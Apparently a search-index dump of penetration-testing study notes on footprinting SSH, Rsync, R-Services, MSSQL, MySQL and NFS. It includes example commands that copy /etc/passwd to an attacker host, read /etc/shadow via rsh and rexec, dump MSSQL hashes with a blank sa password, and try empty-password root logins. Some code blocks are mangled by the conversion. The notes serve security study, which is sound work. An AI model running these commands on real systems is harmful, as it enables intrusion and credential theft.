<code>PermitEmptyPasswords yes</code> Allows the use of empty passwords. <code>PermitRootLogin yes</code> Allows to log in as the root user. <code>Protocol 1</code> Uses an outdated version of encryption. <code>X11Forwarding yes</code> Allows X11 forwarding for GUI applications. <code>AllowTcpForwarding yes</code> Allows forwarding of TCP ports. <code>PermitTunnel</code> Allows tunneling. <code>DebianBanner yes</code> Displays a specific banner when logging in."},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#dangerous-settings","title":"Dangerous Settings","text":""},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#footprinting-the-service","title":"Footprinting the Service","text":"<p>One of the tools we can use to fingerprint the SSH server is\u00a0ssh-audit. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.</p> <p><pre><code> git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit\n</code></pre> <pre><code>./ssh-audit.py &lt;ip&gt;\n</code></pre></p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#change-authentication-method","title":"Change Authentication Method","text":"<p><pre><code>ssh -v cry01t2@&lt;ip&gt;\n</code></pre> For potential brute-force attacks, we can specify the authentication method with the SSH client option\u00a0<code>PreferredAuthentications</code>. <pre><code>ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password\n</code></pre>  [[Rsync]] is a powerful and efficient tool for copying files both locally and remotely. It is widely used for backups, file mirroring, and synchronization due to its ability to minimize network usage through a delta-transfer algorithm.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#scanning-for-rsync","title":"Scanning for Rsync","text":"<pre><code>sudo nmap -sV -p 873 &lt;ip&gt;\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#probing-for-accessible-shares","title":"Probing for Accessible Shares","text":"<p>We can next probe the service a bit to see what we can gain access to. <pre><code>nc -nv &lt;ip&gt; 873\n</code></pre></p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#enumerating-an-open-share","title":"Enumerating an Open Share","text":"<p>Here we can see a share called\u00a0<code>dev</code>, and we can enumerate it further. <pre><code>rsync -av --list-only rsync://127.0.01/dev\n</code></pre></p> <p>From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command\u00a0<code>rsync -av rsync://127.0.0.1/dev</code>. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the\u00a0<code>-e ssh</code>\u00a0flag, or\u00a0<code>-e \"ssh -p2222\"</code>\u00a0if a non-standard port is in use for SSH. This\u00a0guide\u00a0is helpful for understanding the syntax for using Rsync over SSH.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>SSH is vital for secure remote management but must be configured correctly to prevent exploitation.</li> <li>Public-key authentication offers enhanced security over password-based methods.</li> <li>Default configurations may include unnecessary features (e.g., X11 forwarding) that should be evaluated and adjusted.</li> </ul> <p>Exam Priority: High Techniques/Tools: SSH, <code>sshd_config</code>, Key Management Tags: #Linux #SSH #RemoteManagement</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#r-services","title":"R-Services","text":""},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#r-services-overview","title":"R-Services Overview","text":"<p>R-Services are legacy protocols and commands used for remote access and execution between Unix hosts over TCP/IP. While largely replaced by SSH due to significant security flaws, R-Services may still be encountered in penetration tests, especially on older systems. They rely on plaintext communication, making them vulnerable to attacks like Man-in-the-Middle (MITM).</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#key-features-of-r-services","title":"Key Features of R-Services","text":"<ul> <li>Ports: Operate on ports 512, 513, and 514.</li> <li>Transport: Utilize TCP for communication.</li> <li>Security Risks: Data, including passwords, is transmitted in plaintext, enabling easy interception.</li> <li>Common OS: Found on older systems like Solaris, HP-UX, and AIX.</li> <li>Programs: Accessed using a suite of commands collectively known as r-commands.</li> </ul>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#frequently-used-r-commands","title":"Frequently Used R-Commands","text":"Command Service Daemon Port Description rcp rshd 514 Remote file copying between Unix hosts. Similar to <code>scp</code>. rexec rexecd 512 Executes commands on a remote host with authentication. rlogin rlogind 513 Provides terminal access to a remote host. rsh rshd 514 Executes commands on a remote host without login. rstat rpc.rstatd 512/UDP Reports system performance statistics. ruptime rstatd 512 Displays uptime and load averages of remote hosts. rwho rwhod 513/UDP Shows users currently logged into a remote host."},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#commonly-abused-r-commands","title":"Commonly Abused R-Commands","text":""},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#1-rcp-remote-copy","title":"1. rcp (Remote Copy)","text":"<ul> <li>Usage:</li> </ul> <pre><code>rcp &lt;source_file&gt; &lt;remote_user&gt;@&lt;remote_host&gt;:&lt;destination_path&gt;\n</code></pre> <ul> <li>Abuse Potential: If misconfigured, files can be copied without authentication or access restrictions.</li> <li>Example:</li> </ul> <pre><code>rcp /etc/passwd attacker@192.168.1.10:/tmp\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#2-rexec-remote-execution","title":"2. rexec (Remote Execution)","text":"<ul> <li>Usage:</li> </ul> <pre><code>rexec &lt;remote_host&gt; -l &lt;username&gt; &lt;command&gt;\n</code></pre> <ul> <li>Abuse Potential: Credentials are sent in plaintext. An attacker could intercept credentials and commands.</li> <li>Example:</li> </ul> <pre><code>rexec 192.168.1.10 -l root cat /etc/shadow\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#3-rlogin-remote-login","title":"3. rlogin (Remote Login)","text":"<ul> <li>Usage:</li> </ul> <pre><code>rlogin &lt;remote_host&gt;\n</code></pre> <ul> <li>Abuse Potential: If <code>.rhosts</code> is improperly configured, attackers can log in without a password.</li> <li>Example:</li> </ul> <p><code>rlogin -l root 192.168.1.10</code></p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#4-rsh-remote-shell","title":"4. rsh (Remote Shell)","text":"<ul> <li>Usage:</li> </ul> <pre><code>rsh &lt;remote_host&gt; &lt;command&gt;\n</code></pre> <ul> <li>Abuse Potential: Executes commands without requiring a password if <code>.rhosts</code> allows it.</li> <li>Example:</li> </ul> <pre><code>rsh 192.168.1.10 'cat /etc/passwd'\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#penetration-testing-tips","title":"Penetration Testing Tips","text":"<ol> <li> <p>Check for Open Ports:     Scan for ports 512, 513, and 514 using <code>nmap</code>.</p> <p>```bash nmap -p 512-514  <pre><code>2. **Enumerate Services**:  \n    Use tools like **rpcinfo** or **rsh** to gather service information.\n\n    ```bash\nrpcinfo -p &lt;target_ip&gt;\n</code></pre> <li> <p>Exploit Misconfigured <code>.rhosts</code> Files: <code>.rhosts</code> files define trusted hosts and users. Weak configurations allow remote access without passwords.</p> <ul> <li>Look for <code>.rhosts</code> files in user home directories:     ```bash find / -name \".rhosts\" 2&gt;/dev/null <pre><code>4. **Exploit Trusted Host Relationships**:  \n    If `.rhosts` trusts your machine, you can spoof your hostname and execute commands. Example with **rsh**:\n\n    ```bash\n    rsh -l root &lt;target_host&gt; 'cat /etc/shadow'\n    ```\n\n5. **Intercept Credentials**:  \n    Use tools like Wireshark to capture plaintext credentials during R-Command usage.\n### **Mitigation and Recommendations**\n\n- Replace R-Services with **SSH** for secure remote access.\n- Disable unnecessary services in `/etc/services`.\n- Remove `.rhosts` files or restrict them strictly.\n- Use network firewalls to block ports **512\u2013514**.\n\n\n|**Command**|**Service Daemon**|**Port**|**Transport Protocol**|**Description**|\n|---|---|---|---|---|\n|`rcp`|`rshd`|514|TCP|Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the\u00a0`cp`\u00a0command on Linux but provides\u00a0`no warning to the user for overwriting existing files on a system`.|\n|`rsh`|`rshd`|514|TCP|Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the\u00a0`/etc/hosts.equiv`\u00a0and\u00a0`.rhosts`\u00a0files for validation.|\n|`rexec`|`rexecd`|512|TCP|Enables a user to run shell commands on a remote machine. Requires authentication through the use of a\u00a0`username`\u00a0and\u00a0`password`\u00a0through an unencrypted network socket. Authentication is overridden by the trusted entries in the\u00a0`/etc/hosts.equiv`\u00a0and\u00a0`.rhosts`\u00a0files.|\n\n#### /etc/hosts.equiv\n\n```shell\ncat /etc/hosts.equiv\n</code></pre></li> </ul> </li> <p>Now that we have a basic understanding of\u00a0<code>r-commands</code>, let's do some quick footprinting using\u00a0<code>Nmap</code>\u00a0to determine if all necessary ports are open.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#scanning-for-r-services","title":"Scanning for R-Services","text":"<pre><code>sudo nmap -sV -p 512,513,514 &lt;ip&gt;\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#key-takeaways_1","title":"Key Takeaways","text":"<ul> <li>R-Services are inherently insecure due to plaintext communication and lack of modern encryption.</li> <li>Misconfigurations like weak <code>.rhosts</code> files provide attackers an easy entry point.</li> <li>Penetration testers should prioritize port scanning, service enumeration, and <code>.rhosts</code> abuse when encountering R-Services.</li> </ul> <p>Exam Priority: Moderate Tags: #RServices #PenetrationTesting #LegacyProtocols</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#access-control-trusted-relationships","title":"Access Control &amp; Trusted Relationships","text":""},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#overview_1","title":"Overview","text":"<p>R-services have weak access control mechanisms that rely heavily on trust. This design makes them inherently insecure and was one of the primary reasons SSH replaced them. Trusted relationships between systems and users are managed through specific configuration files: <code>/etc/hosts.equiv</code> and <code>.rhosts</code>.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#authentication-methods","title":"Authentication Methods","text":"<ol> <li> <p>Pluggable Authentication Modules (PAM):</p> <ul> <li>Used by r-services for authenticating users.</li> <li>Modular and flexible, but often bypassed due to trusted relationships.</li> <li> <p>Trusted Relationship Files:</p> </li> <li> <p><code>/etc/hosts.equiv</code>:</p> <ul> <li>System-wide trust file.</li> <li>Applies to all users unless overridden by <code>.rhosts</code>.</li> </ul> </li> <li><code>~/.rhosts</code>:<ul> <li>User-specific trust file.</li> <li>Overrides <code>/etc/hosts.equiv</code> for the corresponding user.</li> </ul> </li> </ul> </li> </ol>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#file-syntax","title":"File Syntax","text":"<ul> <li> <p>Format:     ```bash hostname [username] <pre><code>    - **`hostname`**: Specifies the trusted host (can be an IP or hostname).\n    - **`username`**: Optional. Specifies the trusted user on that host.\n- **Examples:**\n\n    - Trust all users from a specific host:\n\n        ```bash\ntrusted-host.example.com\n</code></pre></p> <ul> <li> <p>Trust a specific user from a specific host:</p> <p>```bash trusted-host.example.com trusteduser <pre><code>    - Trust all users from any host (`+` is dangerous):\n\n        `+`\n\n\n---\n\n#### **Security Risks**\n\n1. **Weak Authentication:**\n\n    - Authentication is based solely on the trust established in the files.\n    - No password or additional verification is required.\n2. **Man-in-the-Middle (MITM) Attacks:**\n\n    - Unencrypted communication can be intercepted.\n    - Trusted hostnames/IPs can be spoofed.\n3. **Unauthorized Access:**\n\n    - Improperly configured files (`+`) can allow access to anyone.\n    - Overlooked `.rhosts` files in user directories may create unexpected backdoors.\n\n---\n\n#### **Mitigation Strategies**\n\n1. **Replace R-services with SSH:**\n\n    - Use public-key authentication for secure connections.\n2. **Remove/Restrict Trust Files:**\n\n    - Delete or minimize entries in `/etc/hosts.equiv` and `.rhosts`.\n3. **Enforce Secure Permissions:**\n\n    - Restrict access to `/etc/hosts.equiv` (`chmod 600`).\n    - Regularly audit `.rhosts` files for unnecessary or dangerous entries.\n4. **Network Segmentation:**\n\n    - Limit access to systems using R-services to trusted internal networks only.\n    - \n\n**Note:**\u00a0The\u00a0`hosts.equiv`\u00a0file is recognized as the global configuration regarding all users on a system, whereas\u00a0`.rhosts`\u00a0provides a per-user configuration.\n\n```bash\ncat .rhosts\n</code></pre></p> </li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#logging-in-using-rlogin","title":"Logging in Using Rlogin","text":"<p><pre><code>rlogin &lt;ip&gt; -l htb-student\n</code></pre> We have successfully logged in under the\u00a0<code>htb-student</code>\u00a0account on the remote host due to the misconfigurations in the\u00a0<code>.rhosts</code>\u00a0file. Once successfully logged in, we can also abuse the\u00a0<code>rwho</code>\u00a0command to list all interactive sessions on the local network by sending requests to the UDP port 513.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#listing-authenticated-users-using-rwho","title":"Listing Authenticated Users Using Rwho","text":"<pre><code>rwho\n</code></pre>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#listing-authenticated-users-using-rusers","title":"Listing Authenticated Users Using Rusers","text":"<pre><code>rusers -al &lt;ip&gt;\n</code></pre> <p>As we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#final-thoughts","title":"Final Thoughts","text":"<p>Remote management services can provide us with a treasure trove of data and often be abused for unauthorized access through either weak/default credentials or password re-use. We should always probe these services for as much information as we can gather and leave no stone unturned, especially when we have compiled a list of credentials from elsewhere in the target network.</p>"},{"location":"CPTS/Footprinting/MSSQL/","title":"MSSQL","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/MSSQL/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/MSSQL/#mssql-microsoft-sql-server","title":"MSSQL - Microsoft SQL Server","text":"<p>Overview</p> <ul> <li>MSSQL (Microsoft SQL Server) is Microsoft's closed-source relational database management system (RDBMS).</li> <li>Primarily developed for Windows OS, though compatible versions exist for Linux and macOS.</li> <li>Popular among database administrators and developers for applications running on Microsoft\u2019s .NET framework due to its native support.</li> </ul> <p>Key Points</p> <ul> <li>Closed Source: Unlike MySQL, MSSQL is proprietary.</li> <li>Platform: Runs mainly on Windows; however, some versions support Linux and macOS.</li> <li>Primary Use: Frequently encountered on targets running Windows and in environments using Microsoft-based tech stacks.</li> </ul>"},{"location":"CPTS/Footprinting/MSSQL/#mssql-clients-sql-server-management-studio-ssms","title":"MSSQL Clients - SQL Server Management Studio (SSMS)","text":"<p>Overview</p> <ul> <li>SQL Server Management Studio (SSMS) is a client-side application used to manage MSSQL databases.</li> <li>Can be installed with the MSSQL install package or downloaded separately.</li> <li>Commonly used for both initial configuration and long-term database management by administrators.</li> </ul> <p>Key Points</p> <ul> <li>Installation: Typically installed on the database server but can also be on other systems for remote management.</li> <li>Usage: Allows admin access and can sometimes be found with saved credentials on vulnerable systems.</li> <li>Importance in Penetration Testing: Saved credentials within SSMS could provide access to the MSSQL database if discovered on a compromised host.</li> </ul> <p>Important Tools &amp; Concepts</p> <ul> <li>SSMS: The primary tool for managing MSSQL databases, valuable for initial setup and ongoing maintenance.</li> <li>Vulnerability Focus: Systems with SSMS and saved credentials present potential points for privilege escalation or lateral movement.</li> </ul> <p>This structure is suitable for a penetration testing perspective, focusing on MSSQL's features, typical deployment environments, and potential security implications related to SSMS. ![[Pasted image 20241111104929.png]]</p> <p>Many other clients can be used to access a database running on MSSQL. Including but not limited to:</p> mssql-cli SQL Server PowerShell HeidiSQL SQLPro Impacket's mssqlclient.py <pre><code>#using impacket's mssqlclient.py\nlocate mssqlclient\n</code></pre> Default System Database Description <code>master</code> Tracks all system information for an SQL server instance <code>model</code> Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database <code>msdb</code> The SQL Server Agent uses this database to schedule jobs &amp; alerts <code>tempdb</code> Stores temporary objects <code>resource</code> Read-only database containing system objects included with SQL server"},{"location":"CPTS/Footprinting/MSSQL/#default-configuration","title":"Default Configuration","text":"<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as\u00a0<code>NT SERVICE\\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect. ![[Pasted image 20241111105111.png]]</p>"},{"location":"CPTS/Footprinting/MSSQL/#dangerous-settings-in-mssql","title":"Dangerous Settings in MSSQL","text":"<p>Overview</p> <ul> <li>Adopting an IT administrator's perspective can be valuable when identifying misconfigurations during an engagement.</li> <li>IT environments are often pressured by high workloads and time constraints, which can lead to mistakes and overlooked settings.</li> <li>Even small misconfigurations can pose serious risks, particularly for critical servers or services like MSSQL.</li> </ul> <p>Key Points</p> <ul> <li>Misconfigurations in MSSQL can leave the database vulnerable to compromise.</li> <li>The following settings are worth scrutinizing due to their security implications:</li> </ul>"},{"location":"CPTS/Footprinting/MSSQL/#common-mssql-misconfigurations-to-check","title":"Common MSSQL Misconfigurations to Check","text":"<ol> <li> <p>Lack of Encryption on MSSQL Client Connections</p> <ul> <li>Risk: Unencrypted connections expose data to network eavesdropping.</li> <li>Focus: Ensure encryption is enforced for MSSQL clients connecting to the server.</li> <li> <p>Use of Self-Signed Certificates for Encryption</p> </li> <li> <p>Risk: Self-signed certificates are susceptible to spoofing, potentially allowing attackers to impersonate the server.</p> </li> <li>Focus: Check if encryption is enabled and if so, verify that a trusted CA-signed certificate is used.</li> <li> <p>Use of Named Pipes</p> </li> <li> <p>Risk: Named pipes are less secure and can be exploited for unauthorized access.</p> </li> <li>Focus: Assess if named pipes are necessary; if not, consider disabling this setting.</li> <li> <p>Weak or Default <code>sa</code> Credentials</p> </li> <li> <p>Risk: Default or weak passwords for the <code>sa</code> account create easy entry points for attackers.</p> </li> <li>Focus: Verify that strong credentials are set and consider disabling the <code>sa</code> account if it\u2019s not in use.</li> </ul> </li> </ol>"},{"location":"CPTS/Footprinting/MSSQL/#importance-in-penetration-testing","title":"Importance in Penetration Testing","text":"<p>These settings, if misconfigured, can provide attack vectors that allow for unauthorized database access, interception of sensitive data, or lateral movement within the network.</p>"},{"location":"CPTS/Footprinting/MSSQL/#footprinting-the-mssql-service","title":"Footprinting the MSSQL Service","text":"<p>Overview</p> <ul> <li>Footprinting helps gather detailed information about the MSSQL service by identifying specific configurations, versions, and instances.</li> <li>Using Nmap with MSSQL scripts can yield valuable data, especially when scanning the default TCP port 1433 (typically used by MSSQL).</li> </ul> <p>Key Points</p> <ul> <li>Specific Scans: Tailor Nmap scans to MSSQL to maximize information gathered.</li> <li>Default Scripts: Nmap has built-in MSSQL scripts designed to probe the service and extract relevant details.</li> </ul>"},{"location":"CPTS/Footprinting/MSSQL/#nmap-mssql-scripted-scan-example","title":"[[Nmap]] MSSQL Scripted Scan Example","text":"<p>Information Gathered</p> <ul> <li>Hostname: Provides the server identity within the network.</li> <li>Database Instance Name: Identifies specific MSSQL instance on the server.</li> <li>Software Version: Helps assess if the MSSQL version has known vulnerabilities.</li> <li>Named Pipes Status: Shows if named pipes are enabled, which may present additional security risks.</li> </ul> <p>Command to Run</p> <ul> <li> <p>Use Nmap's MSSQL scripts on the default MSSQL port (1433) for footprinting:</p> <p>```bash nmap -p 1433 --script ms-sql-*  <pre><code>---\n### Importance in Penetration Testing\n\n- **Documentation**: Record details like hostname, instance name, software version, and named pipes status, as they can aid in **further exploitation** or **network enumeration**.\n- **Vulnerability Assessment**: Knowing the exact version and configuration can help identify **potential vulnerabilities** specific to that MSSQL setup.\n\n```shell\nsudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248\n</code></pre>"},{"location":"CPTS/Footprinting/MSSQL/#mssql-ping-in-metasploit","title":"MSSQL Ping in [[Metasploit]]","text":"<p><pre><code>msf6 &gt; search mssql_ping\n</code></pre> ![[Pasted image 20241111110648.png]]</p>"},{"location":"CPTS/Footprinting/MSSQL/#basic-commans","title":"Basic Commans","text":"<pre><code># Get Microsoft SQL server version\nselect @@version;\n\n# Get usernames\nselect user_name()\ngo \n\n# We need to use GO after our query to execute the SQL syntax. \n# List databases\nSELECT name FROM master.dbo.sysdatabases\ngo\n\n# Select a database\nUSE $dbName\ngo\n## Examples: Select a database master\n## USE master\n\n# Check out which one is the current selected database\nSELECT DB_NAME()\ngo\n\n# Show tables\nSELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES\ngo\n\n# Select a database and show content of a specific table.  \nUSE $dbName\nSELECT * FROM $tableName \n\n# Example: Select all Data from Table \"users\". The name of the table (\"users\") was obtained when running the command for showing the tables.\nSELECT * FROM users\ngo\n\n# Get a list of users in the domain\nSELECT name FROM master..syslogins\ngo\n\n# Get a list of users that are sysadmins\nSELECT name FROM master..syslogins WHERE sysadmin = 1\ngo\n\n# And to make sure: \nSELECT is_srvrolemember('sysadmin')\ngo\n# If your user is admin, it will return 1.\n</code></pre>"},{"location":"CPTS/Footprinting/MYSQL/","title":"MYSQL","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/MYSQL/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>MySQL Overview MySQL is an open-source SQL relational database management system (RDBMS) developed and supported by Oracle. It manages structured collections of data, ensuring fast processing and minimal storage. MySQL operates based on a client-server model, with the server handling data storage and distribution. Data is stored in tables containing various columns, rows, and data types. Databases are often stored in a single file (e.g., <code>wordpress.sql</code>).</p> <p>MySQL Clients MySQL clients interact with the database using structured queries. They can insert, delete, modify, or retrieve data using SQL commands. Clients can access the database either through an internal network or the public internet, depending on the configuration. WordPress is a prime example of MySQL usage, storing posts, usernames, passwords, and other data in its database.</p> <p>Key SQL Operations:</p> <ul> <li>Insert</li> <li>Delete</li> <li>Modify</li> <li>Retrieve</li> </ul> <p>MySQL Databases MySQL is ideal for dynamic websites that require fast, efficient data retrieval. It is commonly used in the LAMP stack (Linux, Apache, MySQL, PHP) or LEMP (Linux, Nginx, MySQL, PHP). In web hosting, MySQL serves as a central instance where PHP scripts store content such as:</p> <ul> <li>Headers</li> <li>Texts</li> <li>Meta tags</li> <li>Customer data (e.g., usernames, emails, passwords)</li> <li>Links to files</li> </ul> <p>Sensitive data like passwords are typically encrypted by PHP scripts using one-way encryption methods before being stored.</p> <p>MySQL Commands MySQL translates SQL commands into executable code to perform actions such as:</p> <ul> <li>Displaying, modifying, adding, or deleting rows in tables</li> <li>Changing table structure</li> <li>Creating/deleting relationships, indexes</li> <li>Managing users</li> </ul> <p>SQL errors, often triggered by SQL injections, provide valuable debugging information, which can sometimes reveal how the web application interacts with the database.</p> <p>MariaDB MariaDB is a fork of MySQL, created after the original MySQL developer left Oracle and developed a new open-source RDBMS. MariaDB is compatible with MySQL but has some differences in performance and features.</p> <p>Default Configuration Database management is a vast field that involves complexities, especially as databases scale in size. It requires dedicated roles like database administrators. Information security analysts and software developers also focus on database management in their roles. Experimenting with MySQL/MariaDB configurations helps build a deeper understanding of their functionality.</p> <pre><code>sudo apt install mysql-server -y\ncat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d'\n</code></pre>"},{"location":"CPTS/Footprinting/MYSQL/#dangerous-settings","title":"Dangerous Settings","text":"<p>Many things can be misconfigured with MySQL. We can look in more detail at the\u00a0MySQL reference\u00a0to determine which options can be made in the server configuration. The main options that are security-relevant are:</p> Settings Description <code>user</code> Sets which user the MySQL service will run as. <code>password</code> Sets the password for the MySQL user. <code>admin_address</code> The IP address on which to listen for TCP/IP connections on the administrative network interface. <code>debug</code> This variable indicates the current debugging settings <code>sql_warnings</code> This variable controls whether single-row INSERT statements produce an information string if warnings occur. <code>secure_file_priv</code> This variable is used to limit the effect of data import and export operations. Security Risks in MySQL Configuration1. Sensitive Settings (User, Password, Admin Address)     - Plain Text Entries: Settings like <code>user</code>, <code>password</code>, and <code>admin_address</code> are often stored in plain text within MySQL configuration files.    - File Permissions: If the configuration file permissions are not set properly, unauthorized users may be able to access it. If an attacker gains file access or shell access, they can view the file and obtain the MySQL server credentials.    - Potential Impact: If no additional security measures are in place, an attacker can gain full access to the MySQL database, including sensitive information such as customer data, email addresses, passwords, and personal details, and can even modify this data.2. Verbose Output (Debug and SQL Warnings)     - Excessive Information: The <code>debug</code> and <code>sql_warnings</code> settings provide verbose error messages that are helpful to administrators but pose a security risk if exposed.    - Sensitive Content in Errors: These error messages can contain sensitive information, such as database structure, which attackers can use to identify vulnerabilities or further exploit the system.    - Potential Attack Surface: Attackers could use this information in trial-and-error attacks to discover weaknesses or craft more sophisticated attacks, including SQL injection techniques that could be used to execute system commands on the server.    - Exposure in Web Applications: Error messages are often displayed directly on web applications, making them a prime vector for exploitation. SQL injections can be manipulated to inject malicious commands, as demonstrated in SQL Injection Fundamentals and SQLMap Essentials. ### Footprinting scanning with [[Nmap]] <pre><code>sudo nmap &lt;ip&gt; -sV -sC -p3306 --script mysql*\n\n#mysql does not use and empty password for root. test \nmysql -u root -h &lt;ip&gt;\nmysql -u root -pP4ssword -h &lt;ip&gt;\n</code></pre> ![[Pasted image 20241111004326.png]] <p>if we look at the existing databases we will see several already exist. The most important db for the mysql server are the <code>system schema (sys)</code> and <code>information schema (information_schema)</code> sys contians tables, information and metadata necessary for management. </p> <p><pre><code>mysql&gt; use sys;\nmysql&gt; show tables;\n</code></pre> ![[Pasted image 20241111004307.png]]</p> Command Description <code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code> Connect to the MySQL server. There should\u00a0not\u00a0be a space between the '-p' flag, and the password. <code>show databases;</code> Show all databases. <code>use &lt;database&gt;;</code> Select one of the existing databases. <code>show tables;</code> Show all available tables in the selected database. <code>show columns from &lt;table&gt;;</code> Show all columns in the selected database. <code>select * from &lt;table&gt;;</code> Show everything in the desired table. <code>select * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";</code> Search for needed\u00a0<code>string</code>\u00a0in the desired table."},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/","title":"NFS Network File System","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>Purpose:</p> <ul> <li>NFS (Network File System) allows file access over a network as if they were local files.</li> <li>Developed by Sun Microsystems, it\u2019s mainly used on Linux/Unix systems.</li> </ul> <p>Note: NFS and SMB are similar in purpose but use different protocols and are not directly compatible.</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#key-protocol-versions","title":"Key Protocol Versions:","text":"<ol> <li> <p>NFSv2:</p> <ul> <li>Protocol: Primarily over UDP</li> <li>Compatibility: Broad system support but lacks features of later versions.</li> <li> <p>NFSv3:</p> </li> <li> <p>Features: Variable file sizes, improved error reporting.</p> </li> <li>Limitations: Not fully compatible with NFSv2 clients.</li> <li> <p>NFSv4:</p> </li> <li> <p>Security: Includes Kerberos authentication.</p> </li> <li>Functionality: Firewall-friendly, supports ACLs, and stateful protocol.</li> <li>Efficiency: Only uses port 2049 (UDP/TCP), simplifying firewall configuration.</li> <li> <p>NFSv4.1:</p> </li> <li> <p>Enhancements: Cluster support with pNFS (parallel NFS), multipathing for session trunking.</p> </li> <li>Advantage: Scalable and parallel file access across multiple servers.</li> </ul> </li> </ol>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#nfs-protocol-basics","title":"NFS Protocol Basics","text":"<ul> <li>Based on: ONC-RPC/SUN-RPC protocol.</li> <li>Ports: Uses TCP/UDP port 2049; RPC services run on port 111.</li> <li>Data Format: External Data Representation (XDR), for system-independent data exchange.</li> </ul>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#authentication-and-authorization","title":"Authentication and Authorization","text":"<ul> <li>Auth via RPC: Authentication managed by the RPC protocol options.</li> <li>Authorization:<ul> <li>Derived from file system info.</li> <li>Server Role: Maps UID/GID from clients to UNIX format permissions.</li> <li>Note: NFS primarily uses UNIX UID/GID and group memberships; less secure if mismatched mappings on client/server.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>NFSv4 is most secure and suitable for trusted networks.</li> <li>UID/GID mapping differences can cause permission issues; ensure alignment in trusted networks only.</li> <li>pNFS and multipathing (NFSv4.1) provide scalable, efficient file access across servers.</li> </ul>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#essential-keywords","title":"Essential Keywords:","text":"<ul> <li>NFS, SMB, Sun Microsystems, Linux/Unix, RPC, UID/GID, Kerberos, ACLs, pNFS, Multipathing, Firewall-friendly, Port <code>2049</code></li> </ul>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#default-configuration","title":"Default Configuration","text":"<p><pre><code>cat /etc/exports\n</code></pre> The default\u00a0<code>exports</code>\u00a0file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or 